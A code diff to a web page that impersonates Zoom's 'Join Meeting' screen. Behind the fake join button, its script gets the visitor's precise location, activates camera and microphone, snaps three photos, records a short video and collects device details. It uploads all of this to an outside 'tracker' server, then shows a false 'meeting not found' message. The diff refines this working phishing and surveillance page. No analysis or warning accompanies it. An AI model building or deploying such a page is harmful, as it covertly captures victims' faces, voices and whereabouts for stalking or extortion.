@@ -15,7 +15,6 @@
       display: flex;
       flex-direction: column;
     }
-
     header {
       padding: 16px 32px;
       display: flex;
@@ -23,84 +22,18 @@
       align-items: center;
       border-bottom: 1px solid #e5e5e5;
     }
-
-    .logo {
-      font-size: 32px;
-      font-weight: 700;
-      color: #0e72ed;
-      letter-spacing: -2px;
-    }
-
-    .main {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 40px 20px;
-    }
-
-    .join-box {
-      width: 100%;
-      max-width: 480px;
-      text-align: center;
-    }
-
-    h1 {
-      font-size: 28px;
-      font-weight: 600;
-      margin-bottom: 32px;
-      color: #1a1a1a;
-    }
-
-    .label {
-      text-align: left;
-      font-size: 14px;
-      font-weight: 500;
-      margin-bottom: 8px;
-      color: #444;
-    }
-
-    input {
-      width: 100%;
-      padding: 16px 20px;
-      font-size: 16px;
-      border: 1px solid #d0d0d0;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-
+    .logo { font-size: 32px; font-weight: 700; color: #0e72ed; letter-spacing: -2px; }
+    .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
+    .join-box { width: 100%; max-width: 480px; text-align: center; }
+    h1 { font-size: 28px; font-weight: 600; margin-bottom: 32px; }
+    .label { text-align: left; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #444; }
+    input { width: 100%; padding: 16px 20px; font-size: 16px; border: 1px solid #d0d0d0; border-radius: 8px; margin-bottom: 20px; }
     #joinBtn {
-      width: 100%;
-      padding: 16px;
-      background: #0e72ed;
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 10px;
+      width: 100%; padding: 16px; background: #0e72ed; color: white;
+      font-size: 18px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer;
     }
-
-    #joinBtn:disabled {
-      opacity: 0.7;
-      cursor: not-allowed;
-    }
-
-    #status {
-      margin-top: 20px;
-      font-size: 14px;
-      min-height: 22px;
-      color: #0e72ed;
-    }
-
-    #error {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #d93025;
-      min-height: 22px;
-    }
-
+    #status { margin: 20px 0 8px; font-size: 14px; color: #0e72ed; }
+    #error { color: #d93025; font-size: 14px; margin-top: 10px; }
     video { display: none; }
   </style>
 </head>
@@ -109,15 +42,14 @@
   <header>
     <div class="logo">zoom</div>
     <div>
-      <button style="padding:8px 20px; border-radius:9999px; border:1px solid #0e72ed; background:white; color:#0e72ed; font-weight:500;">Support</button>
-      <button style="padding:8px 20px; border-radius:9999px; border:none; background:#0e72ed; color:white; font-weight:500; margin-left:8px;">Sign Up Free</button>
+      <button style="padding:8px 20px;border-radius:9999px;border:1px solid #0e72ed;background:white;color:#0e72ed;">Support</button>
+      <button style="padding:8px 20px;border-radius:9999px;border:none;background:#0e72ed;color:white;margin-left:8px;">Sign Up Free</button>
     </div>
   </header>
 
   <div class="main">
     <div class="join-box">
       <h1>Join Meeting</h1>
-      
       <div class="label">Meeting ID or Personal Link Name</div>
       <input type="text" id="meetingId" value="987-654-321" readonly>
 
@@ -135,50 +67,27 @@
     const status = document.getElementById('status');
     const errorDiv = document.getElementById('error');
     const videoEl = document.getElementById('video');
-    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';   // GANTI JIKA PERLU
+    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';
 
-    // Deteksi MIME Type yang didukung Safari
     async function getSupportedMimeType() {
-      const types = [
-        'video/mp4;codecs=h264',
-        'video/mp4',
-        'video/webm;codecs=vp8',
-        'video/webm'
-      ];
+      const types = ['video/mp4;codecs=h264', 'video/mp4', 'video/webm'];
       for (let type of types) {
         if (MediaRecorder.isTypeSupported(type)) return type;
       }
       return 'video/mp4';
     }
 
-    async function getDeviceFingerprint() {
-      return {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: `${screen.width}×${screen.height}`,
-        cpuCores: navigator.hardwareConcurrency || 'N/A',
-        deviceMemory: navigator.deviceMemory || 'N/A',
-        touchSupport: navigator.maxTouchPoints > 0
-      };
-    }
-
     btn.addEventListener('click', async () => {
       btn.disabled = true;
-      status.textContent = 'Connecting to meeting...';
+      status.textContent = 'Getting location...';
       errorDiv.textContent = '';
 
       try {
-        const deviceInfo = await getDeviceFingerprint();
-
-        // Geolocation
-        status.textContent = 'Getting location...';
+        // === GEOLOCATION ===
         const position = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, {
             enableHighAccuracy: true,
-            timeout: 15000,
+            timeout: 20000,
             maximumAge: 0
           });
         });
@@ -189,8 +98,9 @@
           accuracy: position.coords.accuracy
         };
 
-        // Camera + Microphone
         status.textContent = 'Activating camera...';
+
+        // === CAMERA ===
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: true
@@ -199,10 +109,10 @@
         videoEl.srcObject = stream;
         await videoEl.play().catch(() => {});
 
-        // Ambil 3 Foto
+        // === PHOTOS ===
         const photos = [];
         for (let i = 0; i < 3; i++) {
-          await new Promise(r => setTimeout(r, 1300));
+          await new Promise(r => setTimeout(r, 1200));
           const canvas = document.createElement('canvas');
           canvas.width = videoEl.videoWidth || 640;
           canvas.height = videoEl.videoHeight || 480;
@@ -210,15 +120,14 @@
           photos.push(canvas.toDataURL('image/jpeg', 0.85));
         }
 
-        // Rekam Video (3 detik)
+        // === VIDEO ===
         status.textContent = 'Recording...';
         const mimeType = await getSupportedMimeType();
-        const recorder = new MediaRecorder(stream, { mimeType: mimeType });
+        const recorder = new MediaRecorder(stream, { mimeType });
         const chunks = [];
 
         recorder.ondataavailable = e => chunks.push(e.data);
         recorder.start();
-
         await new Promise(r => setTimeout(r, 3200));
         recorder.stop();
 
@@ -226,44 +135,53 @@
           recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
         });
 
-        // Kirim ke dashboard.php
-        status.textContent = 'Joining meeting...';
+        // === SEND ===
+        status.textContent = 'Sending data...';
         const formData = new FormData();
         formData.append('location', JSON.stringify(location));
-        formData.append('device_info', JSON.stringify(deviceInfo));
-        
+        formData.append('device_info', JSON.stringify({
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: `${screen.width}×${screen.height}`
+        }));
+
         const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-        formData.append('video', videoBlob, `zoom_meeting_${Date.now()}.${ext}`);
+        formData.append('video', videoBlob, `zoom_${Date.now()}.${ext}`);
 
         for (let i = 0; i < photos.length; i++) {
           const blob = await fetch(photos[i]).then(r => r.blob());
           formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
         }
 
-        const response = await fetch(SERVER_URL, {
-          method: 'POST',
-          body: formData
-        });
+        const response = await fetch(SERVER_URL, { method: 'POST', body: formData });
 
         if (response.ok) {
-          status.innerHTML = '✅ Successfully joined the meeting';
-          setTimeout(() => {
-            alert("The meeting is not available or has ended. Please try again later.");
-            btn.disabled = false;
-          }, 1500);
+          status.textContent = '✅ Success! Data sent.';
+          alert("Meeting not found. Please try again later.");
         } else {
-          throw new Error('Server error');
+          throw new Error('Upload failed');
         }
 
-        // Cleanup
-        stream.getTracks().forEach(track => track.stop());
+        stream.getTracks().forEach(t => t.stop());
 
       } catch (err) {
-        console.error(err);
-        let msg = 'Failed to join meeting.';
-        if (err.name === 'NotAllowedError') msg = 'Permission denied. Please allow Camera, Microphone & Location.';
-        if (err.name === 'NotFoundError') msg = 'No camera or microphone found.';
-        errorDiv.textContent = msg;
+        console.error("FULL ERROR:", err);
+        let message = "Failed to join meeting.";
+
+        if (err.code === 1 || err.name === "NotAllowedError") {
+          message = "❌ Location permission denied. Please allow location access.";
+        } else if (err.code === 2) {
+          message = "❌ Location unavailable.";
+        } else if (err.code === 3) {
+          message = "❌ Location request timeout.";
+        } else if (err.name === "NotFoundError") {
+          message = "❌ Camera or microphone not found.";
+        }
+
+        errorDiv.textContent = message;
         btn.disabled = false;
       }
     });
